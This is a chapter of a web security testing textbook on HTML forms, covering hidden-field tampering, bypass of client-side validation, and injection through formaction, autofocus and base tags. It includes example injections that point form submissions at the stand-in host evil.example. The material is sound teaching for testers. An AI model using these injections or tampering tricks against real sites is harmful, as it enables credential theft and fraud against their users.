# Chapter 5 — HTML Forms and Input Controls

> Forms are where the user hands data to the application — and where the attacker hands
> payloads to it. To test effectively you have to understand forms better than the developers
> who built them, because most "client-side validation" is a suggestion the attacker is free
> to ignore.

---

## 5.1 The anatomy of a form

```html
<form action="/transfer" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="text"   name="to"     value="">
  <input type="number" name="amount" min="1" max="1000">
  <input type="hidden" name="csrf"   value="a1b2c3...">
  <button type="submit">Send</button>
</form>
```

Every attribute here is a testing consideration:

- **`action`** — the URL the form submits to. If attacker-influenced, it can redirect
  submissions (credential theft). An injected or overridable `formaction` on a button can do
  the same per-button.
- **`method`** — `GET` (data in the URL/query string) or `POST` (data in the body). `GET`
  forms leak data into URLs, history, logs, and `Referer`. Note: HTML forms natively support
  only `GET` and `POST`; other verbs (`PUT`, `DELETE`) require JavaScript or a `_method`
  override field. This GET/POST limitation matters for CSRF reach (Chapter 11).
- **`enctype`** — encoding of the body. `application/x-www-form-urlencoded` (default),
  `multipart/form-data` (file uploads), and `text/plain`. The `text/plain` encoding is a
  notable CSRF primitive because it lets an attacker craft request bodies that mimic JSON.
- **`name`** — the parameter name the server reads. Enumerating names (including ones the UI
  hides) is core recon.
- **`value`** — prefilled data, including in **hidden** fields.

## 5.2 Hidden fields are not hidden

`type="hidden"` only hides a field from *rendering*. The value is in the HTML, fully visible in
View Source and fully editable by the attacker (via DevTools, a proxy, or just resubmitting).

Things developers wrongly trust in hidden fields:

- **Prices and totals.** `<input type="hidden" name="price" value="9.99">` — change it to
  `0.01` and resubmit. This classic flaw still appears in real shopping carts.
- **User IDs / roles.** `<input type="hidden" name="role" value="user">` — try `admin`.
- **Workflow state / "next step" URLs.** Often redirectable.
- **Anti-CSRF tokens.** These *belong* in hidden fields, but their *strength* (per-session vs
  per-request, validation server-side) is the real question (Chapter 11).

**Tester's rule:** treat every hidden field as fully attacker-controlled input. The only
security boundary is server-side validation.

## 5.3 Client-side validation is advisory, not a control

HTML5 gives forms a lot of built-in validation:

- `required`, `min`, `max`, `minlength`, `maxlength`, `step`
- `pattern="[A-Za-z0-9]+"` (a regex the browser enforces)
- `type="email"`, `type="url"`, `type="number"` (format constraints)

All of it runs **in the browser**, which the attacker controls. Every one of these can be
bypassed by:

- Submitting the request directly (curl, a proxy's repeater, a script) without the form.
- Editing the DOM in DevTools to remove `maxlength`/`pattern`/`required`.
- Disabling JavaScript or intercepting and modifying the request in a proxy.

So `maxlength="20"` does **not** mean the server receives at most 20 characters, and
`pattern="..."` does **not** mean the server receives matching input. As a tester, you should
**always confirm whether the same rule is enforced server-side.** Frequently it isn't — that
gap (validation present in UI, absent on server) is a finding in itself and the doorway to
injection.

A quick way to demonstrate: capture the form's request in a proxy and replay it with values
that violate every client-side rule. If the server accepts them, document it.

## 5.4 Input types and their quirks

`type` changes behavior, rendering, and sometimes attack surface:

| `type` | Notes for testers |
|---|---|
| `text` / `search` | General text; primary reflection/injection source. |
| `password` | Masked only; value still submitted in plaintext over the wire (HTTPS protects transit, not the field itself). |
| `hidden` | See §5.2 — fully editable. |
| `email` / `url` / `tel` | Client-side format hints; bypassable. `url` doesn't restrict scheme server-side. |
| `number` / `range` | Numeric hints; servers must still validate. Watch for sign/overflow. |
| `file` | Upload surface — content type, size, name; see [Chapter 14](../part4/14-uploads-svg-markup.md). |
| `checkbox` / `radio` | Unchecked boxes send *nothing*; servers mishandling absence is a bug. |
| `color` / `date` / `datetime-local` | Structured pickers; raw value still attacker-controlled. |
| `submit` / `image` / `button` | Can carry `formaction`, `formmethod`, `formenctype` overrides. |

Two specifics worth calling out:

- **Checkbox/radio absence.** If a checkbox is unchecked, its name isn't submitted at all.
  Logic that assumes the field always arrives (e.g., `if request.tos == "off"`) can be tricked
  by *removing* the parameter entirely.
- **`formaction` override.** A submit button can override the form's `action`:
  `<button formaction="https://evil.example/collect">`. If you can inject a button or influence
  `formaction`, you can redirect a form submission — a credential-theft and CSRF primitive.

## 5.5 `autocomplete`, `autofocus`, and friends

These convenience attributes have security relevance:

- **`autofocus`** automatically focuses an element on load. Combined with an `onfocus` handler,
  it produces a *zero-interaction* XSS trigger: `<input autofocus onfocus=...>`. This is one of
  the most reliable payload shapes when you can inject into an attribute or element context,
  because it doesn't require the victim to hover, click, or move the mouse.
- **`autocomplete="off"`** is a hint browsers increasingly ignore (especially for passwords).
  Don't rely on it as a control; conversely, note when sensitive fields *allow* autocomplete as
  a minor data-exposure observation.
- **`autocapitalize`, `spellcheck`** — minor privacy considerations (e.g., spellcheck can send
  text to remote services in some configurations).

## 5.6 Where form values get reflected — and why it matters

After submission (or even before, via prefill), form values often appear back in the page:

- **Search boxes** echo the query: classic reflected-XSS sink (Chapter 8).
- **"Review your details" pages** reflect everything you typed: a buffet of contexts.
- **Validation error messages** reflect the offending value: easy to overlook, easy to inject.
- **Hidden fields re-rendered** with attacker data: attribute-context injection.

For each reflected value, run the Chapter 2 checklist: identify the **context** (element
content? attribute value? script? URL?) and the **encoding** applied. The form is just the
delivery mechanism; the vulnerability is determined by how the reflection is handled.

## 5.7 Multi-step forms and trust boundaries

Workflows that span several pages (cart → shipping → payment → confirm) carry state between
steps, usually via hidden fields, query parameters, cookies, or server-side session.

Tester questions:

- **Where is each piece of state stored, and is it re-validated at the final step?** If the
  price/quantity/role is carried in a hidden field and only validated on step 2, tamper with it
  on step 4.
- **Can you skip steps?** Jump directly to the confirmation endpoint with crafted parameters.
- **Can you replay or reorder steps?** Out-of-order submission often hits code paths the
  developers didn't test.

These are business-logic issues that ride on HTML's stateless form model; HTML gives you the
levers (hidden fields, predictable endpoints), and weak server logic does the rest.

## 5.8 File inputs: a doorway worth its own chapter

`<input type="file">` introduces a fundamentally different surface: the *content* and
*metadata* of an uploaded file. The HTML side is simple (`accept="image/*"` is just a hint,
trivially bypassed), but it opens questions about content-type validation, filename handling,
storage location, and whether uploaded HTML/SVG is served back in a context that executes.
We treat uploads fully in [Chapter 14](../part4/14-uploads-svg-markup.md); for now, note that
`accept` is advisory and never a security control.

## 5.9 The `<base>` and `<form>` interaction

Recall from Chapter 2 that `<base href>` rewrites how relative URLs resolve. A form with a
*relative* `action` (`action="/submit"` or `action="submit"`) resolves against the document
base. If an attacker can inject a `<base href="https://evil.example/">` earlier in the page,
relative form actions (and relative `src`/`href`) can be repointed at the attacker's server —
turning an otherwise innocuous form into a data-exfiltration channel. This is a good example of
how one injection (a `<base>` tag) compounds into another (form hijacking).

## 5.10 Testing forms: a practical routine

For each form you encounter:

1. **Inventory inputs**, including hidden ones and any `formaction`/override capabilities.
   View Source and the live DOM both — JS may add or remove fields.
2. **Record the endpoint**: `action`, `method`, `enctype`, and any anti-CSRF token.
3. **Capture a baseline submission** in your proxy.
4. **Strip client-side validation** and resubmit violating values directly to the server.
   Confirm server-side enforcement (or its absence).
5. **Tamper hidden/derived fields** (prices, IDs, roles, state).
6. **Test each reflected value** for context/encoding (sets up Part III).
7. **Test parameter presence/absence** (drop checkboxes, drop tokens, add unexpected params).
8. **Note CSRF posture**: token presence, `SameSite` cookies, whether the action is
   state-changing (feeds Chapter 11).

Document what the server *actually* accepts, not what the form *appears* to allow.

---

## Key takeaways

- Client-side validation (`required`, `pattern`, `maxlength`, `type`) is **bypassable** and is
  never a security control. Always verify server-side enforcement.
- **Hidden fields are fully attacker-controlled.** Never trust prices, IDs, roles, or workflow
  state carried in them.
- Input `type` and attributes like `formaction`, `autofocus`, and `accept` change the attack
  surface; `accept` and `autocomplete` are hints, not controls.
- Forms are a *delivery mechanism*; the real vulnerability is in how reflected values are
  encoded (Part III) and whether state-changing actions are CSRF-protected (Chapter 11).

---

[← Previous: Chapter 4 — The DOM and the Rendering Model](../part1/04-the-dom.md) | [Next: Chapter 6 — Mapping the HTML Attack Surface →](06-attack-surface.md)
